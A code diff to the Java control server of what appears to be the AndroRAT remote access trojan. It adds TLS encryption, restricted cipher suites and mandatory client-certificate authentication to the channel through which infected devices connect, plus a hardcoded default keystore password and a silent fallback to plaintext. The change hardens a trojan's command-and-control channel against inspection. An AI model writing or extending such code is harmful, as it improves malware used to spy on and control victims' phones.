@@ -28,8 +28,13 @@ import java.io.FileWriter;
 import java.io.IOException;
 import java.net.ServerSocket;
 import java.net.Socket;
+import java.security.KeyStore;
 import java.util.HashMap;
 import java.util.Scanner;
+import javax.net.ssl.KeyManagerFactory;
+import javax.net.ssl.SSLContext;
+import javax.net.ssl.SSLServerSocket;
+import javax.net.ssl.TrustManagerFactory;
 
 import javax.swing.UIManager;
 
@@ -56,9 +61,41 @@ public class Server implements Controler {
 	private boolean online = true;
 	private int Nclient;
 	private GUI gui;
+	
+	// SSL/TLS configuration
+	private boolean useSSL = true;
+	private String keystorePath = "keystore.jks";
+	private String keystorePassword = "changeit";
 
 	private HashMap<String, ClientHandler> clientMap;
 	private HashMap<String, ChannelDistributionHandler> channelHandlerMap;
+	
+	/**
+	 * Creates an SSL context for secure server connections.
+	 * @return Configured SSLContext
+	 * @throws Exception if SSL context cannot be created
+	 */
+	private SSLContext createSSLContext() throws Exception {
+		// Load keystore
+		KeyStore keyStore = KeyStore.getInstance("JKS");
+		try (FileInputStream fis = new FileInputStream(keystorePath)) {
+			keyStore.load(fis, keystorePassword.toCharArray());
+		}
+		
+		// Initialize key manager factory
+		KeyManagerFactory kmf = KeyManagerFactory.getInstance(KeyManagerFactory.getDefaultAlgorithm());
+		kmf.init(keyStore, keystorePassword.toCharArray());
+		
+		// Initialize trust manager factory for client authentication
+		TrustManagerFactory tmf = TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm());
+		tmf.init(keyStore);
+		
+		// Create SSL context
+		SSLContext sslContext = SSLContext.getInstance("TLSv1.2");
+		sslContext.init(kmf.getKeyManagers(), tmf.getTrustManagers(), null);
+		
+		return sslContext;
+	}
 
 	public Server(int port) {
 		if(port == 0) {
@@ -74,13 +111,57 @@ public class Server implements Controler {
 		serverPort = port;
 		clientMap = new HashMap<String, ClientHandler>();
 		channelHandlerMap = new HashMap<String, ChannelDistributionHandler>();
+		
+		// Load SSL configuration from system properties if available
+		String sslEnabled = System.getProperty("androrat.ssl.enabled", "true");
+		this.useSSL = Boolean.parseBoolean(sslEnabled);
+		this.keystorePath = System.getProperty("androrat.keystore.path", "keystore.jks");
+		this.keystorePassword = System.getProperty("androrat.keystore.password", "changeit");
 
 		gui = new GUI(this, serverPort);
 		//gui.addUser("coucou", null, null, null, null, null, null);
 		try {
-			serverSocket = new ServerSocket(serverPort);
+			if (useSSL) {
+				// Create SSL server socket for encrypted connections
+				SSLContext sslContext = createSSLContext();
+				SSLServerSocket sslServerSocket = (SSLServerSocket) sslContext.getServerSocketFactory().createServerSocket(serverPort);
+				
+				// Enable strong cipher suites only
+				String[] enabledCipherSuites = {
+					"TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
+					"TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256",
+					"TLS_DHE_RSA_WITH_AES_256_GCM_SHA384",
+					"TLS_DHE_RSA_WITH_AES_128_GCM_SHA256"
+				};
+				sslServerSocket.setEnabledCipherSuites(enabledCipherSuites);
+				
+				// Enable TLS 1.2 and 1.3 only
+				String[] enabledProtocols = {"TLSv1.2", "TLSv1.3"};
+				sslServerSocket.setEnabledProtocols(enabledProtocols);
+				
+				// Require client authentication
+				sslServerSocket.setNeedClientAuth(true);
+				
+				serverSocket = sslServerSocket;
+				gui.logTxt("SSL/TLS enabled - Server will use encrypted connections");
+			} else {
+				// Fallback to plain socket (not recommended for production)
+				serverSocket = new ServerSocket(serverPort);
+				gui.logTxt("WARNING: SSL/TLS is disabled. Server will accept unencrypted connections!");
+			}
 		} catch (IOException e) {
 			e.printStackTrace();
+			gui.logErrTxt("Failed to create server socket: " + e.getMessage());
+		} catch (Exception e) {
+			e.printStackTrace();
+			gui.logErrTxt("SSL/TLS initialization failed: " + e.getMessage());
+			gui.logTxt("Falling back to unencrypted connection...");
+			try {
+				serverSocket = new ServerSocket(serverPort);
+				this.useSSL = false;
+			} catch (IOException ioe) {
+				ioe.printStackTrace();
+			}
 		}
 
 		setOnline();
